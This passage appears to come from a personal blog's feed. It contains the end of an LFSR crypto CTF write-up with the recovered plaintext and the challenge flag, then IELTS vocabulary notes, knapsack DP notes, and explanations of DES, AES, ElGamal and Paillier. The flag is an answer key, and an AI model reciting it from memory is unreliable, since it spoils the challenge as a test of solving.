impossible to bale it, but he was calmer now and managed to catch them in his tin bucket.  They were no longer than his little finger, but he was not particularly hungry.  The dull ache in his stomach had been growing duller and fainter.  It seemed almost that his stomach was dozing.  He ate the fish raw, masticating with painstaking care, for the eating was an act of pure reason.  While he had no desire to eat, he knew that he must eat to live.\r\nIn the evening he caught three more minnows, eating two and saving the third for breakfast.  The sun had dried stray shreds of moss, and he was able to warm himself with hot water.  He had not covered more than ten miles that day; and the next day, travelling whenever his heart permitted him, he covered no more than five miles.  But his stomach did not give him the slightest uneasiness.  It had gone to sleep.  He was in a strange country, too, and the caribou were growing more plentiful, also the wolves.  Often their yelps drifted across the desolation, and once he saw three of them slinking away before his path.\r\nThe content is an excerpt from Love of Life, by Jack London. The problem is mainly about LFSR and I&#x27;ve tried not to make it hard (with the cost of some running time, actually). Your flag is SUSCTF&#123;Thx_f0r_y0uR_P4ti3nce_:)_GoodLuck!_1bc9b80142c24fef610b8d770b500009&#125; and I hope you will enjoy our game. You&#x27;ll find this problem so ez while solving other problems, which is created by --.&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Crypto</category>
      
      <category>Writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IELT Writing(PART 2)</title>
    <link href="/2021/12/14/IELT-Writing(PART-2)/"/>
    <url>/2021/12/14/IELT-Writing(PART-2)/</url>
    
    <content type="html"><![CDATA[<h1 id="议论文常用表达"><a href="#议论文常用表达" class="headerlink" title="议论文常用表达"></a>议论文常用表达</h1><h2 id="写作的痛点"><a href="#写作的痛点" class="headerlink" title="写作的痛点"></a>写作的痛点</h2><h4 id="从句关系表达不到位，句型单一，只会用并列关系"><a href="#从句关系表达不到位，句型单一，只会用并列关系" class="headerlink" title="从句关系表达不到位，句型单一，只会用并列关系"></a>从句关系表达不到位，句型单一，只会用并列关系</h4><h5 id="example"><a href="#example" class="headerlink" title="example"></a>example</h5><p><em>In the past few decades,the economy in China developed fast and makes people life better and better.</em></p><h5 id="从句句式多样化示例"><a href="#从句句式多样化示例" class="headerlink" title="从句句式多样化示例"></a>从句句式多样化示例</h5><p><strong><em>1.The past few decades witnessed fast development in the economy of China,which makes people’s life better and better.</em></strong></p><p><strong><em>2.As a consequence of the fast development of the Chinese economy,people’s life becomes better and better.</em></strong></p><p><strong><em>3.People’s life becomes better and better,resulting/benefiting from the fast development of our economy in the past few decades.</em></strong></p><h4 id="词穷"><a href="#词穷" class="headerlink" title="词穷"></a>词穷</h4><h5 id="low词"><a href="#low词" class="headerlink" title="low词"></a>low词</h5><p>better        fast     go</p><h5 id="格局高的词"><a href="#格局高的词" class="headerlink" title="格局高的词"></a>格局高的词</h5><p><strong><em>During the last few decades,the Chinese economy forged headlong,which boosted people’s life.</em></strong></p><p>1.fast ,development     - &gt;             <strong>at an accelerated rate</strong>,<strong>at a staggering rate</strong>,</p><p><strong>forge headlong</strong>,<strong>be turbocharged</strong>,<strong>by leaps and bounds</strong>,<strong>burgeon（发芽，迅速成长）</strong>,<strong>augment</strong></p><p>2.lead to,cause   -  &gt;     be responsible for ,result in ,<strong>bring about</strong>,<strong>bring forth</strong>,<strong>be a source of</strong>,<strong>give rise to</strong></p><p>3.come from,be because of  -  &gt;    result from ,root in ,<strong>originate in</strong> ,<strong>stem from</strong> ,<strong>derive from</strong> ,<strong>be ascribed to</strong> ,<strong>be attributable to</strong> ,<strong>be evoked by</strong> </p><p>4.help the development of  -  &gt;   <strong>fuel up</strong> ,<strong>propel/be a propeller to</strong> ,<strong>be a driving force to</strong> ,<strong>expedite the development of</strong> ,<strong>catalyze the development of</strong> </p><p>5.benefit sth.      -   &gt;      <strong>reap benefit from</strong> ,<strong>rake in benefit</strong> ,<strong>be beneficiary of</strong> ,<strong>have beneficent effects on</strong> ,play a positive role ,<strong>exert positive implications on</strong> ,<strong>impose positive influences on</strong> ,<strong>bring about positive outcomes</strong> ,<strong>be advantageous to</strong> ,induce advantages ,<strong>involve/entail/present benefits</strong>   </p><p>6.help be helpful to  -  &gt;  <strong>be conducive to</strong> ,<strong>conduce to</strong> ,<strong>facilitate</strong> ,contribute to ,<strong>be instrumental to</strong> ,<strong>render service to</strong> ,<strong>render assistance to</strong></p><p>7.improve,boost  -  &gt; <strong>exalt</strong> ,<strong>augment</strong> ,<strong>enhance</strong> </p><p>8.do harm to,be harmful to   -   &gt;   <strong>be detrimental to</strong> ,<strong>be to the detriment of</strong> ,<strong>be a jeopardy to/jeopardize</strong> ,<strong>be a hazard to/be hazardous to</strong> ,<strong>inflict harm(loss,damage) on</strong> ,<strong>take heavy tolls on</strong> ,<strong>pose threat(risks) to</strong> ,<strong>make problems crop up for</strong> ,<strong>give rise to problems in</strong> ,<strong>arouse problems in</strong> ,<strong>exert adverse influences on</strong> ,<strong>be of maleficent effects on</strong> ,<strong>bring forth negative outcomes in</strong> ,<strong>play a negative role</strong> </p><p>9.be harmed by  -  &gt;   <strong>be victimized by</strong> ,<strong>be undermined by</strong> ,<strong>be impaired by</strong> ,<strong>fall prey to</strong> ,<strong>pay a heavy price to</strong> ,<strong>be under the threat from</strong> </p><p>10.make sth. worse   -  &gt;   <strong>intensify the problem</strong> ,<strong>make the problem of sth. loom large</strong> ,make sth. go from bad to worse ,worsen the case of ,<strong>exacerbate sth.</strong> </p><p>11.provide  -   &gt;    <strong>afford</strong> ,offer ,<strong>furnish</strong> ,equip sb. with ,<strong>make sth. come to one’s avail</strong></p><p>12.produce   -  &gt;  generate ,<strong>incubate</strong> ,<strong>spawn</strong> ,<strong>engender</strong> ,bring sth. into existence</p><p>13.make efforts to do sth.   -   &gt;     <strong>strive to</strong> ,<strong>endeavour to</strong> ,<strong>do one’s utmost to</strong> ,<strong>exert oneself to</strong> ,<strong>make strenuous efforts to</strong> ,<strong>work assiduously to</strong> , make every attempt to</p><p>14.think,feel     -   &gt;    <strong>reckon</strong> ,<strong>contend</strong> ,<strong>assert</strong> ,<strong>opine</strong> ,<strong>deem</strong> ,be of the opinion that ,<strong>harbour the view that</strong> </p><p>15.agree    -    &gt;    <strong>assent to the view that</strong> ,<strong>subscribe to the view that</strong> ,<strong>be convinced that</strong> ,<strong>consent</strong> ,approve , acknowledge</p><p>16.disagree   -  &gt;     disapprove ,<strong>dissent</strong> ,oppose to ,<strong>negate</strong> ,question if ,doubt if ,take issue with the view that ,be not convinced by the view that</p><p>17.too many too much   -   &gt;    <strong>excessive</strong> ,<strong>exorbitant</strong> ,<strong>superfluous</strong> </p><p>18.more and more     -   &gt;   <strong>progressively</strong> ,gain pace/scale/speed ,ever increasing levels of</p><p>19.busy   -   &gt;    <strong>be tied up with sth.</strong> ,<strong>bustle about doing sth.</strong> ,<strong>be fully scheduled</strong> ,<strong>juggle with sth.</strong></p><ol><li>be related to ,be linked to ,be connected to    -   &gt;   be associated with ,have associations with ,be relevant to ,<strong>bear on sth.</strong> ,<strong>pertain to</strong> </li></ol><p>21.maybe    -    &gt;      tend to ,<strong>be liable to</strong> ,<strong>be prone to</strong> ,<strong>chances are that</strong> ,<strong>odds are that</strong> </p><p>22.should , ought to    -    &gt;    advisable ,desirable ,<strong>laudable</strong> ,<strong>justifiable</strong> ,reasonable</p><p>23.should not   -   &gt;    unreasonable ,unadvisable…</p><p>24.important ,significant    -    &gt;    <strong>be crucial to</strong> ,<strong>be critical to</strong> ,<strong>be vital to</strong> ,<strong>be requisite to</strong> ,<strong>be prerequisite to</strong> ,be key to ,<strong>be of paramount importance</strong> ,<strong>be pivotal to</strong> ,play an unmatched role in ,play a starring role in</p><p>25.necessary   -   &gt;    <strong>be a necessity to</strong> ,<strong>be an integral part of </strong> ,<strong>be a constituent part of</strong> ,<strong>be indispensible to</strong></p><p>26.enough,lack     -     &gt;     <strong>ample</strong> ,adequate ,<strong>sufficient</strong> ,plentiful</p><ol><li>and    -     &gt;     combined with , <strong>couple with</strong> ,plus ,in combination with</li></ol><p>28.some ,several    -   &gt;      multiple ,a collection of ,a chain of , a couple of</p><p>29.many     -    &gt;     <strong>a legion of</strong> ,<strong>sth. are legion</strong> ,<strong>a multitude of</strong> ,<strong>numerous</strong> ,<strong>quantities of</strong> ,<strong>a plethora of</strong></p><p>30.various     -  &gt;     <strong>multifarious</strong> ,<strong>multifaceted</strong> ,<strong>manifold</strong> ,<strong>multifold</strong> ,<strong>assorted</strong> ,<strong>miscellaneous</strong>     phrase:       a wide range of ,<strong>a myraid of</strong> ,a diversity of</p><p>31.convenient ,      -   &gt;    <strong>there is no hassle for sb. to</strong> ,<strong>it entailed no trouble for sb. to</strong>            inconvenient    -    &gt;    …</p><p>32.good    -  &gt;   proper ,appropriate ,favorable ,desirable</p>]]></content>
    
    
    <categories>
      
      <category>课程学习</category>
      
      <category>雅思选修课</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IELTS Writing(PART1)</title>
    <link href="/2021/12/14/IELTS%E9%80%89%E4%BF%AE%E8%AF%BE%E4%BD%9C%E6%96%87/"/>
    <url>/2021/12/14/IELTS%E9%80%89%E4%BF%AE%E8%AF%BE%E4%BD%9C%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h2 id="表示变化趋势"><a href="#表示变化趋势" class="headerlink" title="表示变化趋势"></a>表示变化趋势</h2><h3 id="下降"><a href="#下降" class="headerlink" title="下降"></a>下降</h3><p>fall                        drop                      go down    downturn</p><p>downward trend          reach a low      decrease</p><p>decline                 be reduced           <strong>sag</strong></p><p><strong>sink</strong>                 <strong>descend</strong>             <strong>dwindle</strong></p><p><strong>peter out(逐渐消失)</strong>      <strong>dip(小降)</strong>         </p><p><strong>plunge</strong>          <strong>plummet</strong>             <strong>collapse</strong>         <strong>slump</strong>         ——猛降 </p><h3 id="上升"><a href="#上升" class="headerlink" title="上升"></a>上升</h3><p>rise               reach a high                 upward trend</p><p>increase            climb                   grow</p><p><strong>ascend</strong>           <strong>mount(up)</strong>               <strong>shoot up</strong></p><p><strong>soar</strong>                <strong>surge</strong>                 <strong>skyrocket</strong>       ——猛增 </p><h3 id="持平"><a href="#持平" class="headerlink" title="持平"></a>持平</h3><p>keep unchanging       stay the same           remain fixed</p><p>remain stable            keep constant</p><p><strong>level off/out at</strong>         <strong>stabilise around</strong>       <strong>remain static</strong></p><p><strong>reach a plateau(上升后持平)</strong>         <strong>stagnate</strong></p><h4 id="noun"><a href="#noun" class="headerlink" title="noun"></a>noun</h4><p>level-off           stabilisation             stagnate</p><h3 id="波动"><a href="#波动" class="headerlink" title="波动"></a>波动</h3><p><strong>fluctuate</strong>             <strong>surge and subside</strong>                 <strong>undulate</strong></p><p><strong>increase in fits and starts</strong>             <strong>erratic changes</strong></p><p><strong>turbulent changes</strong></p><h3 id="达到峰值"><a href="#达到峰值" class="headerlink" title="达到峰值"></a>达到峰值</h3><p>reach the peak of                       peak up at                arrive at the top</p><p><strong>crest</strong>                          <strong>culminate</strong>                          <strong>hit the prime at</strong>      （碰撞素数？doge)</p><p><strong>culmination</strong>                     <strong>pinnacle</strong>                   <strong>acme</strong>             <strong>zenith</strong></p><h3 id="达到谷值"><a href="#达到谷值" class="headerlink" title="达到谷值"></a>达到谷值</h3><p>drop to the valley             drop to the bottom             reach the lowest point</p><p><strong>bottom out at</strong>                  <strong>go down to the trough</strong>       reach a low of</p><p><strong>nadir</strong></p><h3 id="猛、快"><a href="#猛、快" class="headerlink" title="猛、快"></a>猛、快</h3><p>steep             sharp             dramatic          considerable</p><p><strong>drastic</strong>              <strong>substantial</strong>             overwhelming</p><p>noticeable           <strong>striking</strong>          <strong>precipitous</strong>(一般指下降快)</p><p><strong>grow/drop by a whopping__</strong></p><h3 id="稳"><a href="#稳" class="headerlink" title="稳"></a>稳</h3><p>stable     steady          gradual</p><p>smooth            moderate           modest</p><h3 id="缓"><a href="#缓" class="headerlink" title="缓"></a>缓</h3><p>slight        slow         gentle              mild                 <strong>marginal</strong></p><h3 id="起点-终点"><a href="#起点-终点" class="headerlink" title="起点/终点"></a>起点/终点</h3><p>start from           begin with               finish at               end with</p><h3 id="加速-减速"><a href="#加速-减速" class="headerlink" title="加速/减速"></a>加速/减速</h3><p> gain speed                speed up                  slow down           lose speed</p><h2 id="高级表述"><a href="#高级表述" class="headerlink" title="高级表述"></a>高级表述</h2><p>The population of female smokers only rose by 1%</p><p><strong>The population of female smokers rose by a negligible 1%</strong></p><p>The difference was getting smaller.</p><p> <strong>The disparity was diminishing.</strong></p><p> People of all education backgrounds had a pay-rise. </p><p><strong>There was a pay-rise across the board. </strong></p><p>since 1940= starting from 1940</p><p><strong>from 1940 onwards</strong></p><p>The higher the education levels were, the higher the incomes were. </p><p><strong>The education levels were in positive correlation with the incomes.</strong></p><p><strong>The education levels were proportionate to the incomes.</strong></p><p>成反比就是<strong>be in negative correlation with be in inverse</strong></p>]]></content>
    
    
    <categories>
      
      <category>课程学习</category>
      
      <category>雅思选修课</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>蓝桥杯赛前学习和刷题（第一天）</title>
    <link href="/2021/11/23/%E8%93%9D%E6%A1%A5%E6%9D%AF%E8%B5%9B%E5%89%8D%E5%AD%A6%E4%B9%A0%E5%92%8C%E5%88%B7%E9%A2%98%EF%BC%88%E7%AC%AC%E4%B8%80%E5%A4%A9%EF%BC%89/"/>
    <url>/2021/11/23/%E8%93%9D%E6%A1%A5%E6%9D%AF%E8%B5%9B%E5%89%8D%E5%AD%A6%E4%B9%A0%E5%92%8C%E5%88%B7%E9%A2%98%EF%BC%88%E7%AC%AC%E4%B8%80%E5%A4%A9%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h1><p>01背包是最基础的背包问题，也是其他背包问题的基础，很多其他背包问题都可以化归为01背包问题，因此，01背包是一种很基础、很重要的背包问题。</p><p>01背包问题的描述如下：</p><script type="math/tex; mode=display">一共有N件物品，第i件（从1开始）物品的重量为w[i]，价值为v[i]，背包容量为W，求在不超出背包容量的前提下，背包最多能装的价值？</script><p>穷举法复杂度太高，不可行。这是动态规划问题的经典题之一，我们采用动态规划的方法对它进行求解。</p><p>动态规划的三个步骤：</p><p>1.定义数组的含义</p><p>2.建立状态转移方程</p><p>3.遍历数组，求出答案</p><script type="math/tex; mode=display">设dp[i][j]表示将前i件物品装入限重为j的背包可获得的最大价值</script><p>不装入第i件物品：$dp[i-1][j]$</p><p>装入第i件物品（前提是能装下），即$dp[i-1][j-w[i]]+v[i]$</p><p>状态转移方程为： $dp[i][j]=max(dp[i-1][j],dp[i-1][j-w[i]]+v[i])$</p><p>由转移方程可知，$dp[i][j]的值只与dp[i-1][0,…,j-1]有关$，因此我们可以采用滚动数组的方法来优化空间复杂度，注意为了避免上一层循环被覆盖，循环的时候j只能逆向枚举，伪代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">dp[<span class="hljs-number">0</span>,...,W]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span>,...,N:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> W,...w[i]:<br>        dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-w[i]]+v[i])<br></code></pre></td></tr></table></figure><h1 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h1><p>完全背包跟01背包很相似，它们的差别就在于完全背包每种物品有无限多个，其他条件一致。这里的数组定义和01背包一致，但是状态转移方程发生了改变——当装入第i种物品后，还可以继续装这个物品，因此转移到$dp[i][j-w[i]]而不是dp[i-1][j-w[i]]$，于是状态转移方程为$dp[i][j]=max(dp[i-1][j],dp[i][j-w[i]]+v[i])$，我们也可以对其进行空间复杂度优化，但此时我们应该正向枚举去覆盖原有结果，伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">dp[<span class="hljs-number">0</span>,...W]=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,...,N:<br>    <span class="hljs-keyword">for</span> j =w[i],...,W:<br>        dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-w[i]]+v[i])<br></code></pre></td></tr></table></figure><h2 id="另一种分析方法"><a href="#另一种分析方法" class="headerlink" title="另一种分析方法"></a>另一种分析方法</h2><p>01背包只有两种选择即取0件和取1件，但是完全背包可以取0，1，2，…，直到超过限重($k&gt;j/w[i]$)，所以状态转移方程为：$dp[i][j]=max((dp[i-1][j-k<em>w[i]]+k</em>v[i]) for\ every \ k)$</p><p>上面也可以进行空间复杂度的优化，但要注意这里的max里面是dp[i-1]，和01背包一样，必须逆向枚举，优化后的伪代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">dp[<span class="hljs-number">0</span>,...,W]=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i =<span class="hljs-number">1</span>,...,N:<br>    <span class="hljs-keyword">for</span> j =W,...,w[i]:<br>        <span class="hljs-keyword">for</span> k = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,...,j/w[i]]:<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-k*w[i]]+k*v[i])<br></code></pre></td></tr></table></figure><h2 id="还有一种分析方法"><a href="#还有一种分析方法" class="headerlink" title="还有一种分析方法"></a>还有一种分析方法</h2><p>还有一种方法，就是把完全背包转化为01背包，可采用二进制转换的方法转为01背包，这里暂不做讨论。</p><h1 id="剪枝策略"><a href="#剪枝策略" class="headerlink" title="剪枝策略"></a>剪枝策略</h1><p>如果有更物美价廉的物品，就把贵又不值的物品扔去。</p><h1 id="多重背包"><a href="#多重背包" class="headerlink" title="多重背包"></a>多重背包</h1><p>多重背包和前面两种背包很相似，只是它每种物品的数量既不是1，也不是无穷，而是有限个n[i]，分析跟完全背包的分析二相近，伪代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">dp[<span class="hljs-number">0</span>,...,W]=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i= <span class="hljs-number">1</span>,...,N:<br>    <span class="hljs-keyword">for</span> j = W,...,w[i]:<br>        <span class="hljs-keyword">for</span> k = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,...,<span class="hljs-built_in">min</span>(n[i],j/w[i])]:<br>            dp[j]=<span class="hljs-built_in">max</span>(dp[j],dp[j-k*w[i]]+k*v[i])<br></code></pre></td></tr></table></figure><p>还可以像完全背包分析三的方法转为二进制化成01背包求解来求解。</p><h1 id="混合背包"><a href="#混合背包" class="headerlink" title="混合背包"></a>混合背包</h1><p>如果物品有的只有一件，有的有有限件，有的有无穷件，那么这样的问题叫做混合背包问题。如果是01背包和完全背包混合的话，根据物品类别确定顺序和逆序即可；如果再加上多重背包，用单调队列解即可。另外一种可行的方法是把多重背包转为01背包，虽然复杂度稍稍变大，但也已经很优秀了。</p><h1 id="二维背包"><a href="#二维背包" class="headerlink" title="二维背包"></a>二维背包</h1><p>二维背包是指对于每件物品，具有两种不同的费用，选择一件物品要付出两种代价，对于每种代价都有可付出的最大值（也即背包容量）。设第i件物品所需的两种代价分别为a[i]和b[i]，两种代价的最大值（背包容量）分别为V和U，物品的价值为c[i]。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>费用增加一维，状态增加一维即可。设f[i] [v] [u]表示前i件物品付出两种代价分别为v和u时可获得的最大价值。</p><p>状态转移方程就是：$f[i][v][u]=max(f[i-1][v][u],f[i-1][v-a[i]][u-b[i]]+c[i])$，类似的，这里也可以采用滚动数组的方式优化空间复杂度，并且当每件物品只可以取一次时v和u采用逆序的循环，当物品有如完全背包时采用顺序的循环；如多重背包时拆分物品。</p><h1 id="隐藏的二维背包"><a href="#隐藏的二维背包" class="headerlink" title="隐藏的二维背包"></a>隐藏的二维背包</h1><p>有时二维背包这样隐含地说出来：最多只能取M件物品。这就相当于每件物品多了件数这一代价，可付出的代价最大为M。这样再根据每种物品可取件数采取01背包还是完全背包还是多重背包。如果要求恰好取M件，那么就在$f[0…V][M]$中寻找答案。</p><h1 id="分组背包"><a href="#分组背包" class="headerlink" title="分组背包"></a>分组背包</h1><p>分组背包指每一组的物品互斥的背包问题。将每组看成一个大物品，再从大物品里面选择小物品，因此只需要加一层循环即可。</p><p>伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> 所有组k:<br>    <span class="hljs-keyword">for</span> v=V,..<span class="hljs-number">.0</span>:<br>        <span class="hljs-keyword">for</span> 所有的i 属于组k:<br>            f[v]=<span class="hljs-built_in">max</span>(f[v],f[v-w[i]]+c[i])<br></code></pre></td></tr></table></figure><p>显然这里也可以进行一个小剪枝。</p><h1 id="有依赖的背包问题"><a href="#有依赖的背包问题" class="headerlink" title="有依赖的背包问题"></a>有依赖的背包问题</h1><p>待补充</p><h1 id="求背包问题方案数"><a href="#求背包问题方案数" class="headerlink" title="求背包问题方案数"></a>求背包问题方案数</h1><p>将max改为sum即可，这样是因为状态转移方程已经考察了所有的可能背包组成方案。</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
      <category>DP</category>
      
      <category>背包问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分组密码AES和DES</title>
    <link href="/2021/09/12/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81AES%E5%92%8CDES/"/>
    <url>/2021/09/12/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81AES%E5%92%8CDES/</url>
    
    <content type="html"><![CDATA[<h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>DES是一种典型的Feistel结构密码体制，它使用长度为56比特的密钥加密（解密）长度为64比特的明文（密文），获得长度为64比特的密文（明文）。其加密流程如下：</p><p>1.传入64比特的明文，进行IP置换</p><p>2.通过密钥扩展算法获得轮密钥，扩展算法为：将初始密钥进行PC-1置换后得到$C_0,D_0$两部分，再进行本轮的循环移位后进入PC-2置换（从56比特选取48比特）得到轮密钥。下一轮的轮密钥和上一轮的轮密钥关系为：</p><script type="math/tex; mode=display">C_i=C_{i-1}<<<<r_i</script><script type="math/tex; mode=display">D_i=D_{i-1}<<<<r_i</script><script type="math/tex; mode=display">K_i=PC-2(C_iD_i)</script><p>3.初始置换后的明文分为左右两部分，进入轮密钥控制的16次F函数（轮函数）迭代（Feistel结构），前十五次的迭代方式为：$L<em>i=R</em>{i-1}，R<em>i=L</em>{i-1}+F(R_{i-1},K_i)$，最后一次的迭代方式稍稍不一样，为：</p><script type="math/tex; mode=display">L_{16}=L_{15}+F(R_{15},K_{16}),R_{16}=R_{15}</script><p>这里的”+”代表异或，最后一次不同的原因是为了保证加解密的一致性——若加密采用的轮密钥为$(K<em>1,K_2,…,K</em>{16})$，则解密采用轮密钥为$(K<em>{16},K</em>{15},…,K_1)$，并且加解密流程采用完全相同的结构和轮函数</p><p>4.进行初始逆置换$IP^{-1}$，得到密文</p><h2 id="核心轮函数F"><a href="#核心轮函数F" class="headerlink" title="核心轮函数F"></a>核心轮函数F</h2><p>1.将输入的32比特通过扩展函数E变为48比特</p><p>2.将得到的48比特与子密钥异或后进入S盒，作为S盒的输入</p><p>3.S盒是一个非线性变换，它将输入通过8个并置的6进4出（比特位）的S盒压缩成32比特。每个S盒都有一张替换表，替换表都有4行16列，对应前十六个整数（长度为4的比特串）的二进制整数全排列。设S盒的输入为$a_1a_2a_3a_4a_5a_6$，则$S(a_1a_2a_3a_4a_5a_6)$就是S盒表中第$a_1a_6$行和第$a_2a_3a_4a_5$列交叉的那个数，这里的$a_1a_6 $和$a_2a_3a_4a_5 $都是二进制整数</p><p>4.将S盒得到的32位比特输出作为输入进行P置换，P置换的结果就是轮函数的输出</p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>AES即美国国家高级加密标准（$Advanced\ Encryption\ Standard$），其算法为$Rijndael$算法，分组长度通常为128比特，密钥长度通常也为128比特，加密轮数为10轮</p><h2 id="加密步骤"><a href="#加密步骤" class="headerlink" title="加密步骤"></a>加密步骤</h2><p>首先将输入的明文分组为16个字节$a<em>{00}a</em>{10}a<em>{20}a</em>{30}a<em>{01}a</em>{11}a<em>{21}a</em>{31}a<em>{02}a</em>{12}a<em>{22}a</em>{32}a<em>{03}a</em>{13}a<em>{23}a</em>{33}$，并+按照顺序映射为状态字节矩阵，加密操作结束时，密文按同样顺序从状态抽取，映射顺序为：</p><script type="math/tex; mode=display">\begin{pmatrix}a_{00}&a_{01}&a_{02}&a_{03}\\a_{10}&a_{11}&a_{12}&a_{13}\\a_{20}&a_{21}&a_{22}&a_{23}\\a_{30}&a_{31}&a_{32}&a_{33}\\\end{pmatrix}</script><p>1.由密钥拓展算法将128比特的种子密钥拓展成11个128比特的轮密钥，每一个轮密钥同样被表示成与明文状态矩阵大小相同的矩阵</p><p>2.进行初始白化：将明文状态矩阵与第0轮的轮密钥进行加法运算</p><p>3.进行完全相同的9轮变换，每一轮变换都是以上一轮的输出作为输入，依次执行字节替换、行移位、列混合和轮密钥加四种运算</p><p>4.最后一轮的迭代变换稍有不同，这一轮变换依次执行字节替换、行移位和轮密钥加，没有列混合</p><p>5.将最后一轮输出的结果按照顺序从状态中抽取出来就是密文</p><h3 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h3><p>状态矩阵每一行按照不同的移位值进行循环左移</p><h3 id="列混合（列混淆）"><a href="#列混合（列混淆）" class="headerlink" title="列混合（列混淆）"></a>列混合（列混淆）</h3><p>将状态矩阵每一列看作$GF(2^8)$域上的次数不超过3的多项式，与下列矩阵作乘法运算</p><script type="math/tex; mode=display">\begin{pmatrix}02&03&01&01\\01&02&03&01\\01&01&02&03\\03&01&01&02\\\end{pmatrix}</script><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>此处的加法应理解为域上的加法运算（与异或等价）</p><h3 id="密钥扩展方案"><a href="#密钥扩展方案" class="headerlink" title="密钥扩展方案"></a>密钥扩展方案</h3><p>待补充</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Crypto</category>
      
      <category>理论学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码系统</title>
    <link href="/2021/09/08/%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/"/>
    <url>/2021/09/08/%E5%AF%86%E7%A0%81%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Diffie-Hellman"><a href="#Diffie-Hellman" class="headerlink" title="Diffie-Hellman"></a>Diffie-Hellman</h1><p>Diffie-Hellman密钥交换。</p><p>基于离散对数困难问题。</p><h1 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h1><p>基于离散对数问题。</p><h2 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h2><p>1.选取足够大的素数p保证p-1存在很大的素因子，使得在$Z_p$上求解离散对数问题是困难的</p><p>2.选取$Z_p ^*$的生成元g</p><p>3.随机选取整数k满足$0≤k≤p-2$，并计算$g^k\equiv y\ (mod\ p)$</p><p>公钥为{$p,g,y$}，私钥为{$k$}。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>选取一个随机整数$r\in Z_{p-1}$，得到密文$(y_1,y_2)=(g^rmod\ p,my^rmod\ p)$，其中m为要发送的消息（明文）。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>解密时，通过私钥k计算$(y_1^k)^{-1}y_2mod\ p=(g^{rk})^{-1}my^rmod\ p=m$.</p><p>参考CTF WIKI</p><h1 id="Paillier-Cryptosystem"><a href="#Paillier-Cryptosystem" class="headerlink" title="Paillier Cryptosystem"></a>Paillier Cryptosystem</h1><h2 id="密钥生成-1"><a href="#密钥生成-1" class="headerlink" title="密钥生成"></a>密钥生成</h2><p>一般过程：</p><p>1.随机选择两个大素数p,q满足$gcd(pq,(p-1)(q-1))=1$，当p,q长度相同时一定有该结论</p><p>2.计算$n=pq，\lambda=lcm(p-1,q-1)=(p-1)(q-1)/gcd(p-1,q-1)$</p><p>3.随机选取整数$g,0&lt;g&lt;n^2$</p><p>4.$L(x)=(x-1)/n$</p><p>5.计算$\mu=(L(g^\lambda(mod\ n^2)))^{-1}\ (mod\ n)$</p><p>6.公钥为（n，g），私钥为（$\lambda，\mu$）</p><p>特殊情况：</p><p>通常，为简便，我们参数选取如下：</p><p>1.$g=n+1$</p><p>2.$\lambda=\varphi(n)$</p><p>3.$\mu=\varphi(n)^{-1}\ (mod\ n)$</p><h2 id="加密-1"><a href="#加密-1" class="headerlink" title="加密"></a>加密</h2><p>1.m为要发送的消息（明文），满足$0≤m&lt;n$</p><p>2.随机选取r，使得$gcd(r,n)=1$</p><p>3.密文$c:c=g^m\cdot r^n\ (mod\ n)$</p><h2 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h2><p>$m=(L(c^\lambda\ (mod\ n^2))\cdot\mu)\ (mod\ 